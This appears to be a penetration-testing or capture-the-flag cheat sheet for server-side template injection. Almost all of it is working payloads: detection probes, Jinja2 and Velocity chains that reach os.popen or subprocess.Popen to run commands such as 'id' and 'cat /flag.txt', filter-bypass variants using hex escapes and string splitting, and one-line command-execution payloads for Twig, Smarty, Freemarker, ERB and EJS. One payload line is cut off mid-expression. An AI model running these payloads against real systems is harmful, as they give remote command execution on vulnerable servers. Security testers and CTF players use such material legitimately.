# SSTI

## Fast Tests

```text
{{7*7}}
${7*7}
<%= 7*7 %>
#{7*7}
*{7*7}
```

## Payloads

```django
{{lipsum.__globals__.os.popen('id').read()}} // Using Jinja 2

{{request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')|attr(

{{lipsum.__getattribute__('__gl'+'obals__')}}

+print+({lipsum:1})|list()|map(**{'attribute':'__globals__'})

code = b'[c for c in "".__class__.__base__.__subclasses__()]'
code = b'[c for c in "".__class__.__base__.__subclasses__() if c.__name__=="Popen"][0]("cat /fl*", shell=True, stdout=-1).communicate()[0]'

# 502, class &#39;subprocess.Popen &#39;
code = b'"".__class__.__base__.__subclasses__()[502]'
code = b'"".__class__.__base__.__subclasses__()[502]("cat /flag.txt", shell=True, stdout=-1).communicate()[0]'

#data = {"name": "#set( $foo = 7*7 )\n$foo"} # Testing SSTI
data = {"name": "#set($s='')#set($base=$s.__class__.__mro__[1])#foreach($sub in $base.__subclasses__())$foreach.index: $sub\n#end"} # Listing subclasses
data = {"name": "#set($x='')\n#set($cycler=$x.__class__.__mro__[1].__subclasses__()[479])\n#set($init=$cycler.__init__)\n#set($globals=$init.__globals__)\n#set($os=$globals.os)\n#set($popen=$os.popen('/readflag'))\n$popen.read()"}
```

## Jinja2

```django
{{config}}
{{self.__dict__}}
{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}
{{''.__class__.__mro__[1].__subclasses__()}}
{{''.__class__.__mro__[1].__subclasses__()[502]('cat /flag.txt',shell=True,stdout=-1).communicate()[0]}}
{{lipsum.__globals__['os'].popen('cat /flag.txt').read()}}
```

## Filter Bypass

```django
{{request|attr('application')|attr('__globals__')|attr('__getitem__')('__builtins__')|attr('__import__')('os')|attr('popen')('id')|attr('read')()}}
{{lipsum.__getattribute__('__gl'+'obals__')['os'].popen('id').read()}}
{{()|attr('__class__')|attr('__base__')|attr('__subclasses__')()}}
```

## Other Engines

```text
Twig: {{_self.env.registerUndefinedFilterCallback("system")}}{{_self.env.getFilter("id")}}
Smarty: {system('id')}
Freemarker: <#assign ex="freemarker.template.utility.Execute"?new()> ${ ex("id") }
Velocity: #set($s='')#set($x=$s.class.forName('java.lang.Runtime').getRuntime().exec('id'))
ERB: <%= `id` %>
EJS: <%= global.process.mainModule.require('child_process').execSync('id') %>
```

Read Code From Blackbox

```
{{lipsum.__globals__.os.sys.modules.linecache.cache}}
```

## Resources

* [https://hacktricks.boitatech.com.br/pentesting-web/ssti-server-side-template-injection](https://hacktricks.boitatech.com.br/pentesting-web/ssti-server-side-template-injection)
* [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection)
* [https://def.camp/wp-content/uploads/dc2023/Remi%20Gascou.pdf](https://def.camp/wp-content/uploads/dc2023/Remi%20Gascou.pdf)
